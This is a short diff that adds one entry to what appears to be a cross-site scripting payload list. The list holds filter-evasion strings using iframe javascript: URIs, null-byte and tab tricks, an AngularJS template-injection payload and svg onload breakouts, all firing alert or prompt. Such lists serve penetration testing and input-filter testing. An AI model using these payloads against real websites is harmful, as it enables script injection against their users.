@@ -38,6 +38,7 @@ ________________________________________________________________________________
 <iframe %00 src="&Tab;javascript:prompt(1)&Tab;"%00>
 <iframe src iframe src="javascript:javascript:alert(1)"></iframe src>
 _______________________________________________________________________________________________________________________________________________________________
+<img ='><svg onload="alert(1)"'>
 {{$on.constructor('alert(1)')()}} //very powerful on some
 "><svg onload=alert(1)>
 
